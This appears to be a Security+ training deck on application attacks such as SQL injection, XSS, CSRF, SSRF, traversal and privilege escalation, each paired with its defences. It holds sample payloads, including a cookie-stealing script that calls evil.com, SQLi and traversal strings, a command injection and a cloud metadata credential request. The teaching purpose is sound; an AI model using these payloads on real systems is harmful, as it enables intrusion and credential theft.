The Application Attack Surface
Applications process untrusted input. Every input field, URL parameter, and API endpoint is a potential entry point.
Input Is Never Trusted
Every byte that enters an application from the outside world -- form fields, URL parameters, HTTP headers, cookies, uploaded files -- must be treated as hostile until validated. The attacker controls the input. The developer controls the validation. Only one of them is disciplined about it.
Application vs. Network Layer
Network firewalls operate at layers 3 and 4. Application attacks occur at layer 7. A firewall allows HTTPS traffic to a web server by design -- it cannot distinguish a legitimate POST from a SQL injection payload hidden in that POST. Application-layer controls are required.
OWASP Top 10 (2021)
The Open Web Application Security Project publishes the most critical web application risks. The 2021 edition's top categories include A01 Broken Access Control, A03 Injection (XSS folded in here), A04 Insecure Design, and A07 Identification and Authentication Failures. SY0-701 draws heavily from OWASP categories. Every vulnerability in this module maps to that list.
Why Applications Are Hard to Secure
Applications are written by humans under deadline pressure, using frameworks with their own vulnerabilities, consuming libraries with undisclosed CVEs, connecting to databases with over-permissioned service accounts. Security is not the default state -- it must be explicitly engineered in.

SQL Injection Overview
The attacker inserts SQL syntax into an input field, altering the query the database executes. Consistently in OWASP Top 3.
Facility intake portal authenticates researchers: SELECT * FROM users WHERE username='[input]' AND password='[input]'. Researcher ID R-999 enters username: admin'--. The double-dash comments out the password check. The query becomes: SELECT * FROM users WHERE username='admin'. Authentication bypassed. Full admin session granted.
Classic SQLi
Input appended directly into a SQL string. The payload closes the original query context using quotes or comment sequences, then injects arbitrary SQL. Results are returned directly in the HTTP response, making data exfiltration immediate and visible to the attacker.
Error-Based SQLi
Database error messages reveal schema details. An attacker intentionally triggers errors by injecting syntax that produces verbose output. MySQL, MSSQL, and Oracle all produce distinct error formats that reveal table names, column names, and query structure when not properly suppressed.
Blind SQLi
No data is returned directly. The attacker infers information from binary true/false responses or timing. Boolean-based: ask yes/no questions ("is the first character of the admin password greater than M?"). Time-based: use SLEEP() to confirm query execution by measuring response delay.
Out-of-Band SQLi
Data is exfiltrated through a secondary channel such as DNS lookups or HTTP requests triggered by the database server. Used when in-band and blind techniques are blocked. Requires the database server to have outbound network connectivity -- tightly restricted in hardened environments.
Slide 4 of 35
SQL Injection Mechanics and Defense
Understanding the attack at code level is required to understand why the defenses work.
-- Vulnerable query: string concatenation SELECT * FROM specimens WHERE id = ' + userInput + ' -- Attacker input: 1' OR '1'='1 -- Resulting query: returns ALL rows SELECT * FROM specimens WHERE id = '1' OR '1'='1' -- Parameterized query: the fix SELECT * FROM specimens WHERE id = ? -- Input is treated as data, never as SQL syntax
Parameterized Queries
The most effective SQLi defense. The query structure is compiled separately from the input. User data cannot alter the query's logical structure because it is bound as a typed parameter, not concatenated as a string. Supported by every modern database library.
Stored Procedures
Pre-compiled queries in the database. When properly implemented (without dynamic SQL inside), they provide the same protection as parameterized queries. The application calls the procedure by name; the database executes a fixed query with bound parameters.
Least Privilege on DB Account
Even if SQLi succeeds, the damage is limited by the database account's permissions. A read-only account cannot DROP TABLE. A schema-restricted account cannot query the system catalog for other table names. Defense in depth applies at the database layer too.

Cross-Site Scripting (XSS)
The attacker injects malicious scripts into content that is then rendered by the victim's browser. Three distinct types.
Stored XSS (Persistent)
Malicious script is saved to the server's database and served to every user who views that content. A forum post containing a script tag executes in the browser of every subsequent visitor. The attacker does not need to target individual users -- the server delivers the payload for them.
Reflected XSS (Non-Persistent)
The payload is in the URL or request, and the server reflects it back in the response without storage. Requires the victim to click a crafted link. The URL contains the script; the server echoes input into the page without sanitization. Common in search results and error messages.
DOM-Based XSS
The payload never reaches the server. Client-side JavaScript reads from an attacker-controlled source (URL fragment, localStorage) and writes it to the DOM without sanitization. Invisible to server-side input validation -- the attack is entirely in the browser's document model. Hardest to detect with WAFs.
What XSS Actually Does
A script executing in the victim's browser has access to: session cookies (unless HttpOnly), saved form data, page content, keystrokes, and the ability to make authenticated requests on the user's behalf. Session hijacking via XSS is trivially simple when HttpOnly is not set on session cookies.
Slide 6 of 35
XSS Mechanics and Defense
The attack exploits the browser's trust in content served from a legitimate origin.
-- Stored XSS: attacker submits this as a comment <script>document.location='https://evil.com/steal?c='+document.cookie;</script> -- DOM XSS: vulnerable client-side code const name = location.hash.substring(1); // reads #payload from URL document.getElementById('greeting').innerHTML = 'Hello, ' + name; // unsafe -- Fix: use textContent, not innerHTML document.getElementById('greeting').textContent = 'Hello, ' + name;
Output Encoding
Encode all user-controlled data before inserting it into HTML, JavaScript, CSS, or URL contexts. In HTML context: &lt; &gt; &amp; &quot; &#x27;. Each output context requires its own encoding scheme. A single encoding function for all contexts is incorrect and dangerous.
Content Security Policy (CSP)
HTTP response header that specifies which script sources the browser should trust. A strict CSP blocks inline scripts and scripts from untrusted origins. Even if XSS payload injection succeeds, CSP prevents execution. Requires careful tuning -- overly permissive CSP provides no protection.
HttpOnly and SameSite Cookies
HttpOnly prevents JavaScript from reading the cookie -- session theft via document.cookie is blocked even if XSS fires. SameSite=Strict prevents the cookie from being sent on cross-site requests, mitigating CSRF. Both flags should be set on every session cookie.
Slide 7 of 35
Cross-Site Request Forgery (CSRF)
The attacker tricks a victim's authenticated browser into submitting a request to a trusted site without the victim's knowledge.
Researcher R-44 is logged into the facility portal. The attacker sends R-44 a link to an external page containing a hidden form. When R-44 visits, the page auto-submits a POST to the facility portal: "Transfer specimen 7-Bravo to External Lab 4." The portal processes it because the request carries R-44's valid session cookie. The researcher never clicked anything.
How CSRF Works
Browsers automatically attach cookies to every request for a domain -- including cross-origin requests triggered by attacker-controlled pages. The server sees a request with valid credentials and processes it. The server cannot distinguish an intentional request from a forged one without additional verification.
What CSRF Can Accomplish
Any state-changing action the victim can perform: password change, email change, funds transfer, data deletion, admin action, permission escalation. Read-only requests are not exploitable -- CSRF forges actions, not data retrieval (the response is not accessible cross-origin due to SOP).
CSRF Tokens
Server generates a unique, secret, unpredictable token per session. Every state-changing form includes the token as a hidden field. Server validates the token on submission. Attacker cannot forge the token because they cannot read the victim's page content (same-origin policy blocks it).
SameSite Cookie Attribute
SameSite=Strict: browser never sends cookie on cross-site requests -- CSRF is impossible. SameSite=Lax: cookie sent on top-level navigations but not on background requests. SameSite=None: legacy behavior, requires Secure flag. SameSite=Strict is the strongest CSRF defense at the cookie level.
Slide 8 of 35
CSRF vs. XSS Comparison
Two injection-adjacent attacks with different mechanics, different trust relationships, and different defenses.
XSS -- Script Execution
Attacker injects code that runs in the victim's browser in the context of a trusted origin. The browser trusts the injected script as if it came from the legitimate site. XSS exploits the user's trust in the website's content. The attack is FROM the target site TO the user.
CSRF -- Forged Requests
Attacker tricks the victim's browser into sending a request to a trusted site. No script injection required. CSRF exploits the server's trust in the authenticated user's browser. The attack is FROM a third-party site TO the target server, using the victim as an unwitting relay.
Combined Attack: XSS Bypasses CSRF Tokens
If XSS exists on a site that uses CSRF tokens, the XSS payload can read the CSRF token from the DOM and include it in a forged request. XSS effectively breaks CSRF defenses. This is why XSS is considered more severe -- it undermines multiple independent defenses simultaneously.
SY0-701 Exam Distinction
XSS: attacker injects script, browser executes it. CSRF: attacker forges request, server processes it. The exam will present a scenario and ask which attack it describes. Key signal: if a script executes in the victim's browser, it is XSS. If a request is forged to a trusted server, it is CSRF.

Buffer Overflow Overview
Writing more data into a buffer than it was allocated to hold, overwriting adjacent memory with attacker-controlled content.
The facility's legacy C-based specimen tracking daemon allocates a 256-byte buffer for incoming specimen IDs. An attacker sends a 512-byte payload. The extra 256 bytes overwrite the function's return address on the stack. When the function returns, execution jumps to the attacker's shellcode instead of the calling function. Root shell obtained. No authentication required.
Stack Buffer Overflow
The most common variant. Data is written beyond the end of a stack-allocated buffer, overwriting the saved return address. The attacker controls where the function returns -- typically to injected shellcode or to existing executable code (return-oriented programming). Exploits are highly reliable against unprotected binaries.
Heap Buffer Overflow
Overflow occurs in heap-allocated memory. More complex to exploit than stack overflows because heap layouts are less predictable. Attacker overwrites heap metadata, function pointers, or adjacent objects. Browser exploits frequently use heap overflows because browsers heap-allocate most objects.
Integer Overflow
An integer variable wraps around its maximum value. A length variable calculated as unsigned short can wrap from 65535 to 0, causing a zero-length buffer to be allocated, which is then immediately overflowed by the actual data. Integer overflows often precede and enable buffer overflows in secure code.
Slide 10 of 35
Buffer Overflow Defenses
Modern operating systems implement multiple complementary mitigations. Each can be bypassed individually; together they raise the cost significantly.
ASLR -- Address Space Layout Randomization
The OS randomizes the base addresses of the stack, heap, and libraries on each execution. An attacker cannot hardcode the address of their shellcode because its location changes each run. Bypassed through info leaks that disclose memory addresses or by brute-forcing (32-bit entropy is manageable; 64-bit is not).
DEP/NX -- Data Execution Prevention
Memory pages are marked either writable or executable, but not both. The attacker can write shellcode to the stack, but the CPU refuses to execute it. Bypassed by return-oriented programming (ROP), which chains small executable snippets already present in memory without injecting new code.
Stack Canaries
A random sentinel value is placed between the local variables and the saved return address. Before returning, the function checks that the canary is intact. If it was overwritten, the program terminates. Bypassed by info leaks that disclose the canary value before the overflow, then reproduce it in the payload.
Safe Languages and Bounds Checking
Memory-safe languages (Rust, Java, Go, Python) perform automatic bounds checking on array accesses and prevent direct pointer manipulation. Buffer overflows are essentially impossible in these languages by design. New systems code is increasingly written in Rust for this reason. Legacy C/C++ code remains vulnerable.

Directory Traversal
The attacker manipulates file path parameters to access files outside the intended directory tree.
-- Application intends to serve: /var/www/specimens/[filename] -- Attacker-controlled request: GET /view?file=../../../etc/passwd -- Resolved path: /var/www/specimens/../../../etc/passwd = /etc/passwd -- URL-encoded variant (bypasses naive filters): GET /view?file=..%2F..%2F..%2Fetc%2Fpasswd -- Double-encoded variant: GET /view?file=..%252F..%252F..%252Fetc%252Fpasswd
What Gets Exposed
Configuration files with credentials, private keys, password hashes, application source code, user home directories, system configuration, database connection strings. On Windows, traversal to C:\Windows\win.ini or C:\inetpub\wwwroot\web.config. Any file readable by the web server process is accessible.
Defense: Path Canonicalization
Resolve the full canonical path of the requested file before any access check. After canonicalization, verify the path starts with the allowed base directory. Using Java's File.getCanonicalPath() or Python's os.path.realpath() and then checking startswith() is the correct pattern.
Defense: Chroot and Containerization
Restrict the web server process to a directory subtree using chroot jail or container namespaces. Even if traversal succeeds, the process cannot access files outside its root. The jail limits the blast radius -- /etc/passwd inside the jail is not the real system's passwd file.

Privilege Escalation
Gaining access rights beyond what was originally granted. The step that converts a foothold into full compromise.
Vertical Escalation
A lower-privileged user gains higher-privileged access -- standard user to local admin, local admin to domain admin, user to root. This is what most people picture when they hear "privilege escalation." The goal is to reach a level that allows unrestricted access to the system or network.
Horizontal Escalation
A user accesses another user's resources at the same privilege level. User A accesses User B's files, emails, or account without authorization. Often achieved by manipulating object references (IDOR -- Insecure Direct Object Reference) in application URLs or API calls. Same privilege level, wrong identity.
Local Privilege Escalation
Attacker has local code execution (not root) and exploits an OS vulnerability, misconfigured SUID binary, weak file permissions, unquoted service paths, or writable PATH entries to elevate to root or SYSTEM. Common post-exploitation step after initial access via a phish or web shell.
Application Privilege Escalation
Within an application, a standard user accesses admin functionality by manipulating request parameters. Changing ?role=user to ?role=admin in a request, forging a JWT with an elevated role claim, or accessing /admin/ endpoints that lack authorization checks. The application fails to enforce its own access controls.
Slide 13 of 35
Privilege Escalation Techniques
Specific vectors used in real environments. Each maps to a specific misconfiguration or vulnerability class.
SUID/SGID Binary Abuse
On Linux, SUID binaries run as the file owner (often root) regardless of who executes them. If a custom binary has SUID root set and can be manipulated (via injection, path manipulation, or symlink attack), any user can run code as root. GTFOBins catalogs SUID binaries with known escalation techniques.
Kernel Exploits
Unpatched kernel vulnerabilities allow unprivileged processes to escalate to ring 0. Dirty Cow (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), and PwnKit (CVE-2021-4034) are recent examples. Kernel exploits are highly reliable but require a matching kernel version. Kernel patching eliminates them.
Token Impersonation (Windows)
Windows access tokens represent the security context of a process. An attacker with SeImpersonatePrivilege (commonly held by service accounts) can impersonate any token -- including SYSTEM. Potato exploits (Hot Potato, Juicy Potato, PrintSpoofer) use this technique to escalate from service accounts to SYSTEM.
Defense: Least Privilege + Patching
Most privilege escalation requires either a vulnerability (patch it) or a misconfiguration (harden it). Regular patching eliminates kernel exploits. Removing unnecessary SUID bits eliminates SUID abuse. Restricting dangerous Windows privileges eliminates token impersonation. These are operational discipline, not exotic security tooling.

The Injection Attack Family
SQL injection is one member. The underlying pattern -- user input interpreted as code -- applies across many contexts.
LDAP Injection
Input is unsafely inserted into an LDAP query. Attackers modify the query to bypass authentication or enumerate directory entries. LDAP special characters (* ( ) \ / NUL) must be escaped. LDAP injection is less common than SQLi but follows identical principles. Affects applications using directory services for authentication.
Command Injection (OS Injection)
Input is passed to a system shell (exec, system, popen). The attacker appends shell metacharacters: semicolons, pipes, backticks. Payload: ; cat /etc/passwd. Command injection gives direct OS code execution -- it is one of the most critical vulnerabilities. Avoid shell calls entirely; use library functions instead.
XML/XPath Injection
Applications using XPath to query XML data are vulnerable if input is concatenated into the XPath expression. Similar to SQLi mechanics but for XML document traversal. The attacker can read arbitrary nodes from the XML document. Parameterized XPath queries (where supported) and strict input validation are the defenses.
Universal Injection Defense
Separate code from data. Use parameterized interfaces (prepared statements, parameterized XPath, sanitized LDAP filters). Validate input type and range. Reject inputs containing metacharacters when no legitimate use case exists for them. Never pass user input to an interpreter without explicit validation and escaping.
Slide 15 of 35
Session Attacks
Session tokens are the keys to authenticated state. Stealing or predicting them bypasses authentication entirely.
Session Hijacking
Attacker obtains a valid session token and uses it to impersonate the authenticated user. Token obtained via XSS (document.cookie theft), network sniffing (unencrypted HTTP), or server-side storage theft. Once the token is presented, the server has no way to distinguish the attacker from the legitimate user.
Session Fixation
Attacker forces the victim to use a session ID chosen by the attacker. The attacker provides a link with a pre-set session ID (SID=attacker-chosen-value). The victim authenticates with this ID. The attacker then uses the same ID -- it is now elevated to an authenticated session. Defense: regenerate session ID on login.
Token Prediction
Session tokens generated with weak or predictable random sources can be brute-forced or predicted. Sequential IDs (session=1001, session=1002) are trivially enumerable. Tokens based on timestamp XOR user ID are guessable. Tokens must be generated from a cryptographically secure random number generator (CSPRNG), not from predictable data.
Defense: Secure Session Management
128-bit+ CSPRNG-generated tokens. HttpOnly and Secure flags on session cookies. Session timeout and idle timeout. Regenerate session ID on privilege elevation (login, sudo, checkout). Bind session to user agent and IP (with awareness of mobile/VPN user impact). Invalidate all sessions on password change.

Insecure Direct Object Reference (IDOR)
The application exposes internal object references in URLs or parameters, and fails to verify the requester owns the object.
Researcher R-202 requests their specimen report at: /reports/download?id=8841. They notice the URL and try: /reports/download?id=8840. The server returns another researcher's confidential report without any authorization check. IDOR is horizontal privilege escalation through reference manipulation -- no exploit required, just changing a number.
Why It Occurs
Developers trust that users will only request their own objects. They authenticate the user but forget to verify that the authenticated user is authorized to access the specific object requested. Authentication proves identity. Authorization proves the right to access a specific resource. Both are required on every access.
Defense: Server-Side Authorization
Every access to an object must verify: does this authenticated user have permission to access this specific object? The check must happen on the server, every time, for every request. Client-side "hiding" of links to objects the user does not own is not a security control -- it is merely UI cosmetics.
Indirect References
Replace direct database IDs with indirect references: a per-user mapping table that translates a user-scoped reference (file=3 in the user's namespace) to the actual database row. The user never sees or manipulates real IDs. Even if they tamper with the reference, they can only reach objects in their own namespace.
Slide 17 of 35
File Upload Attacks
File upload functionality is one of the most dangerous features to implement. Unrestricted file upload is a critical severity finding.
Web Shell Upload
The attacker uploads a file with a server-side scripting extension (.php, .asp, .jsp). If stored in a web-accessible directory and executed by the web server, it creates a persistent backdoor. The web shell accepts commands over HTTP, providing OS code execution without any additional exploit. Direct path to full compromise.
Content-Type Bypass
Server validates the MIME type from the Content-Type header -- a value the attacker fully controls. Changing Content-Type from application/x-php to image/jpeg is trivial with any proxy tool. File extension checks can be bypassed with double extensions (shell.php.jpg), null bytes (shell.php%00.jpg), or alternate extensions (.phtml, .phar).
Defense: Multi-Layer File Validation
Validate file type by content inspection (magic bytes), not by Content-Type header or file extension alone. Rename uploaded files to a random UUID before storage -- strip the original extension entirely. Never store uploads in a web-accessible directory. Strip EXIF and metadata. Serve files through a dedicated handler, not directly by the web server.
Slide 18 of 35
XML and API Attacks
Modern applications expose XML parsers and REST/SOAP APIs -- each with its own attack surface.
XXE -- XML External Entity
XML parsers support entity definitions that reference external resources. An attacker injects an entity referencing a local file (file:///etc/passwd) or an internal network resource. The parser fetches and includes the content in the response. XXE can read files, perform SSRF, and in some configurations enable denial of service (billion laughs).
API Broken Object Level Authorization
REST APIs that expose object IDs without server-side authorization checks are vulnerable at scale. GET /api/users/1234/profile returns any user's profile when the ID is changed. API authorization is frequently weaker than web UI authorization because APIs are developed faster and tested less rigorously. OWASP API Security Top 10 (2023) leads with this class (A1:2023 Broken Object Level Authorization).
Mass Assignment
Frameworks automatically bind request parameters to object properties. An attacker adds fields not present in the form: POST /register includes ?role=admin. If the framework binds all parameters to the user object, the attacker self-assigns admin. Defense: use allowlists of permitted properties; never bind all request parameters to objects automatically.
XXE Defense
Disable external entity processing in the XML parser. In Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false). In PHP: libxml_disable_entity_loader(true). External entity processing serves no legitimate purpose in most applications. Disable it at the parser level; do not attempt to filter at the input level.

Server-Side Request Forgery (SSRF)
The attacker tricks the server into making HTTP requests to attacker-specified destinations, using the server as a proxy.
The facility's specimen image fetcher accepts a URL parameter: /fetch?url=https://public-image-host.com/image.jpg. The attacker submits: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server is an AWS EC2 instance. The IMDS endpoint returns IAM credentials. The attacker now has cloud credentials with whatever permissions the EC2 role holds.
Internal Network Scanning
SSRF turns a public-facing server into a port scanner and HTTP proxy for the internal network. The attacker requests http://10.0.0.1:22, http://10.0.0.1:3306, iterating IPs and ports. The server's response (connection refused vs. timeout vs. 200 OK) reveals the internal network topology and open services.
Cloud Metadata Service Abuse
Cloud providers offer instance metadata at link-local addresses (AWS: 169.254.169.254, GCP: 169.254.169.254, Azure: 169.254.169.254). These endpoints return credentials, instance configuration, and network details. SSRF against cloud metadata services is one of the most critical vectors in cloud-hosted applications.
SSRF Defense
Validate and allowlist URLs against a strict set of permitted destinations. Block requests to RFC 1918 addresses (10.x, 172.16-31.x, 192.168.x), loopback (127.x), and link-local (169.254.x). Disable redirects or re-validate the final destination after following redirects. In cloud: use IMDSv2 (requires PUT before GET, preventing SSRF) and restrict EC2 role permissions.
Slide 20 of 35
Input Validation Strategy
The primary defense against all injection classes. Validation must be comprehensive, consistent, and server-side.
Allowlisting over Denylisting
Define what is acceptable and reject everything else. A field expecting a US phone number should accept only digits, spaces, dashes, and parentheses -- 10-12 characters. Denylisting attempts to enumerate all bad inputs, which always fails. Attackers find new encodings and sequences that bypass the denylist. Allowlists are provably correct.
Validate on the Server
Client-side validation (JavaScript) is a UX convenience, not a security control. Any attacker with a proxy tool (Burp Suite, OWASP ZAP) intercepts the request after client-side validation and modifies it before it reaches the server. Server-side validation is the only validation that counts for security purposes.
Context-Specific Encoding
The same input may need different encoding depending on where it is used. User-controlled data in HTML context requires HTML encoding. In JavaScript context: JS encoding. In SQL: parameterized query. In URL: URL encoding. Using the wrong encoding for the context leaves the application vulnerable even with encoding in place.
Defense in Depth for Input
Layer defenses: input validation at the application layer, parameterized queries at the data layer, WAF rules at the perimeter layer, CSP headers at the browser layer. No single layer catches everything. An attacker who bypasses WAF rules still faces parameterized queries. An attacker who crafts a valid query still faces database least privilege.
Slide 21 of 35
Web Application Firewall (WAF)
A WAF operates at the HTTP layer, inspecting requests and responses against a rule set. It is a compensating control, not a replacement for secure code.
What a WAF Does
Inspects HTTP/HTTPS traffic for patterns associated with known attack signatures: SQL keywords in parameters, script tags in input, path traversal sequences, command injection metacharacters. Can operate in detection mode (log only) or blocking mode. ModSecurity with OWASP CRS is the open-source standard.
WAF Limitations
WAFs are regularly bypassed by novel encoding, obfuscation, and attack variants not in the rule set. A WAF blocking SELECT also blocks legitimate use of that word in comments. False positive tuning is time-consuming. WAFs add latency. TLS termination must occur before WAF inspection -- creates a decryption choke point.
Positive vs. Negative Security Model
Negative security model (most WAFs): block known bad patterns. Positive security model: only allow known good patterns (strict allowlist at the WAF layer). Positive model is far more effective but requires extensive profiling of legitimate traffic to build the allowlist. Often used for high-value specific endpoints rather than entire applications.
WAF in Defense in Depth
A WAF provides an additional layer between the attacker and the application. It can stop automated scanners, buy time during an active attack, and catch common exploitation patterns. It cannot substitute for fixing vulnerabilities in the application code. Fix the code; use the WAF as a temporary compensating control and ongoing detection layer.
Slide 22 of 35
Secure Development Lifecycle (SDL)
Security integrated into every phase of software development, not added after deployment.
Design Phase
Threat modeling: identify assets, enumerate threats, design mitigations before a line of code is written. STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) is the standard framework. Security requirements documented alongside functional requirements.
Development Phase
Secure coding standards, code review with security focus, static application security testing (SAST) integrated into CI/CD pipeline. SAST tools (Semgrep, SonarQube, Checkmarx) scan source code for vulnerability patterns before deployment. Developer security training reduces injection vulnerabilities at the source.
Testing Phase
Dynamic application security testing (DAST) probes the running application for vulnerabilities. Penetration testing before production release. Dependency scanning for known CVEs in third-party libraries. Interactive AST (IAST) instruments the running application to detect vulnerabilities during normal test execution.
Shift Left
"Shift left" means moving security testing earlier in the development pipeline. A vulnerability found in design costs hours to fix. Found in code review: days. Found in testing: weeks. Found in production: months and incident response costs. The economic argument for shift-left security is overwhelming.
Slide 23 of 35
Clickjacking and UI Redressing
The attacker overlays a transparent frame over a legitimate page, tricking the user into clicking elements they cannot see.
How Clickjacking Works
The attacker loads the target site in a transparent iframe on their malicious page. A decoy UI element is positioned beneath the user's cursor. The user thinks they are clicking the attacker's button but is actually clicking the hidden iframe's button -- a "Confirm Transfer" or "Grant Permission" button on the legitimate site. No JavaScript injection required.
X-Frame-Options Header
HTTP response header that controls framing. DENY: never allow this page to be framed. SAMEORIGIN: only frames from the same origin are allowed. ALLOW-FROM: specify a trusted origin (deprecated in modern browsers). All pages that perform sensitive actions should set X-Frame-Options: DENY to prevent framing entirely.
CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none' is the modern equivalent of X-Frame-Options: DENY. CSP frame-ancestors overrides X-Frame-Options in browsers that support CSP Level 2+. Setting both provides defense in depth for older browsers. This directive blocks the page from being loaded inside any iframe.
Scope of Damage
Any authenticated action can be triggered by clickjacking: deleting an account, authorizing an OAuth application, posting content, confirming a financial transaction. Particularly dangerous on admin interfaces where a single click can have high-impact consequences. Social engineering lure pages make the attack highly effective against non-technical users.
Slide 24 of 35
Error Handling and Information Disclosure
Verbose error messages are reconnaissance gifts. Applications must fail gracefully without revealing internal details.
What Verbose Errors Reveal
Database type and version, table and column names, file system paths, framework versions, internal IP addresses, stack traces showing code structure, configuration values. Each piece narrows the attack surface. An error revealing "MySQL 5.7.32 at /var/lib/mysql/data" tells the attacker exactly which CVEs to check for unpatched vulnerabilities.
User-Facing vs. Internal Errors
User-facing errors should be generic: "An error occurred. Please try again." or "Request ID 8af3b2 -- contact support." Detailed errors go to application logs, accessible only to operations staff. This dual-mode error handling provides operational visibility without reconnaissance value. Never expose stack traces or database errors to the end user.
Directory Listing
Web servers that expose directory listings when no index file exists reveal file names, backup files, configuration files, and source code. Disable directory listing on all web server configurations (Apache: Options -Indexes; Nginx: autoindex off). This is one of the most common misconfigurations found in external assessments.
Slide 25 of 35
Broken Authentication
Authentication mechanisms that can be bypassed, brute-forced, or exploited to gain unauthorized access.
Credential Stuffing
Automated submission of stolen username/password pairs from data breaches against a target application. Effective because users reuse credentials. Defense: rate limiting, CAPTCHA, anomaly detection on login attempts, breach detection integration (HIBP API), MFA as a backstop. Account lockout alone is insufficient due to low success rate per account.
Password Spraying
Attempting a small set of common passwords against a large number of accounts. Avoids account lockout thresholds by staying below the per-account attempt limit. One or two attempts per account per day against thousands of accounts. Defense: MFA, anomaly detection on distributed low-rate login attempts across many accounts.
Weak Password Reset
Predictable reset tokens (sequential, timestamp-derived, short), tokens that never expire, reset via guessable security questions ("your mother's maiden name"), and tokens sent to non-verified secondary contacts. Password reset is an authentication bypass path -- it must be as secure as the login itself.
Multi-Factor Authentication Bypass
OTP phishing (real-time proxy attack that relays credentials and OTP to the real site before the token expires). SIM swapping to receive SMS OTP. Push notification fatigue attacks (spam MFA push until user approves to stop the noise). Solution: FIDO2 hardware keys are phishing-resistant because the key verifies the site's origin.

Race Conditions and TOCTOU
Time-of-check to time-of-use vulnerabilities exploit the window between when a condition is verified and when it is acted upon.
The facility's specimen withdrawal system checks balance, then processes the withdrawal in two separate operations. An attacker sends two simultaneous withdrawal requests for the entire available balance. Both requests pass the balance check before either commits. Both withdrawals execute. The account is overdrawn by the full balance. Classic double-spend via race condition.
TOCTOU in File Systems
A program checks that a symlink points to a safe location, then opens the file. Between check and open, the attacker replaces the symlink target. The program opens a different, potentially sensitive file. Privileged setuid programs are frequent targets. Defense: open the file atomically and check permissions after opening, not before.
Double-Spend Attacks
Any operation that reads a value, computes a result, and writes back is vulnerable to concurrent exploitation. Database transactions with proper isolation levels (SERIALIZABLE) prevent this. Application-level locks, database row-level locking (SELECT FOR UPDATE), and atomic compare-and-swap operations eliminate the window.
Defense: Atomic Operations and Transactions
Combine check and act into a single atomic operation. At the database level: use transactions with appropriate isolation, row locking, and optimistic concurrency control. At the OS level: use open() with O_NOFOLLOW and O_CLOEXEC to prevent symlink attacks. At the application level: avoid read-modify-write patterns without exclusive locks.

Deserialization and Modern Injection Vectors
Advanced injection classes that exploit language-level features rather than string concatenation.
Insecure Deserialization
Applications that deserialize untrusted data can be exploited when the deserialization process itself executes code. Java, PHP, Python pickle, and Ruby Marshal all support native serialization. Gadget chains combine existing classes to achieve arbitrary code execution during deserialization. Never deserialize data from untrusted sources using native serializers.
Prototype Pollution (JavaScript)
JavaScript objects inherit from prototypes. If an attacker can set properties on Object.prototype (via unsanitized merge operations: merge(obj, JSON.parse(untrustedInput))), those properties appear on all objects in the application. This can bypass security checks that rely on property existence, enable code execution via property injection, or cause denial of service.
Template Injection (SSTI)
Server-side template engines (Jinja2, Twig, Pebble, Freemarker) evaluate expressions in templates. If user input is rendered inside a template without sanitization, the attacker can inject template expressions that execute server-side code. Jinja2: {{7*7}} returns 49 -- confirming SSTI. Then: {{config.items()}} enumerates app config. Leads to RCE.

Application Security Testing
Systematic methods for discovering vulnerabilities before attackers do. Each method has a different detection profile.
SAST -- Static Analysis
Analyzes source code without executing it. Detects SQL concatenation patterns, unsanitized output, hard-coded credentials, dangerous function calls. Runs in CI/CD pipeline -- results appear in minutes. High false positive rate requires tuning. Cannot detect logic flaws or runtime-only vulnerabilities. Low barrier to adoption.
DAST -- Dynamic Analysis
Probes the running application by sending malicious inputs and observing responses. Detects XSS, SQLi, IDOR, SSRF, and configuration issues that only manifest at runtime. Requires a deployed test environment. Slower than SAST. Finds different vulnerability classes. OWASP ZAP and Burp Suite Professional are standard tools.
SCA -- Software Composition Analysis
Scans third-party dependencies and open-source libraries for known CVEs. The majority of modern application code is third-party. A single vulnerable transitive dependency can expose the entire application. SCA tools (Dependabot, Snyk, Black Duck) alert on new CVEs published for used dependencies. Integrate into CI/CD for continuous monitoring.
Penetration Testing
Human attackers simulate adversarial behavior against the full application stack. Finds business logic flaws, authentication bypasses, and attack chains that automated tools miss. Scope is defined in writing (Rules of Engagement). Black box (no prior knowledge), white box (source code provided), gray box (partial knowledge like a registered user). Required for compliance in many frameworks.

Supply Chain Attacks
Compromise a trusted dependency, build tool, or update mechanism to reach the final target through its own supply chain.
Dependency Confusion
An attacker publishes a malicious package to a public registry (npm, PyPI) with the same name as an internal private package, but with a higher version number. If the build system checks the public registry first (or at all), it downloads and executes the malicious package. SolarWinds, Codecov, and event-stream are well-documented examples of supply chain compromise.
Malicious Package Publication
Attackers publish packages with names similar to popular packages (typosquatting: reqeusts vs. requests), take over abandoned packages, or compromise maintainer accounts. A malicious package installed during build or at runtime has full access to the application's environment, credentials, and data. npm install with sudo is particularly dangerous.
Defense
Pin exact dependency versions (lockfiles). Verify package integrity using checksums (npm integrity hashes, pip hash-checking mode). Use private package mirrors. Review dependencies before initial adoption. Monitor CVE databases for used packages. Sign and verify build artifacts. Apply SLSA (Supply chain Levels for Software Artifacts) framework principles.

Vulnerability Scoring and Prioritization
Not all vulnerabilities are equal. CVSS provides a standardized framework for communicating severity and prioritizing remediation.
CVSS v3.1 Base Score
Common Vulnerability Scoring System. Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability Impact. Scores range 0.0-10.0. Critical: 9.0-10.0. High: 7.0-8.9. Medium: 4.0-6.9. Low: 0.1-3.9. None: 0.0.
Temporal and Environmental Metrics
Temporal metrics adjust score based on exploit availability and patch status. Environmental metrics adjust for the specific organization's context -- a vulnerability affecting a system with no sensitive data scores lower environmentally. CVSS is a starting point for prioritization, not a final answer. Business context matters.
CVE and NVD
CVE (Common Vulnerabilities and Exposures) assigns unique identifiers to publicly disclosed vulnerabilities. NVD (National Vulnerability Database) enriches CVEs with CVSS scores, CWE classifications, and references. MITRE maintains the CVE program. Security tools use CVE IDs for consistent cross-reference. Know how to look up a CVE by ID.
Risk-Based Prioritization
Patch High/Critical vulnerabilities in externally accessible, privileged, or data-handling systems first. CVSS score alone is insufficient -- a CVSS 9.0 on an isolated dev server is less urgent than a CVSS 7.0 on a public-facing authentication endpoint. Add exploitability context (is there a working public exploit?) and asset criticality to the scoring matrix.

1 Attacker enters ' OR '1'='1 in the specimen ID field and receives the full specimen manifest. Attack: Classic SQLi. Failed control: input validation, parameterized queries. Remediation: parameterize all database queries immediately.
2 The researcher comment board displays a script tag that steals cookies from every visitor. Attack: Stored XSS. Failed control: output encoding, CSP. Remediation: encode all output in HTML context; add Content-Security-Policy: script-src 'self' header.
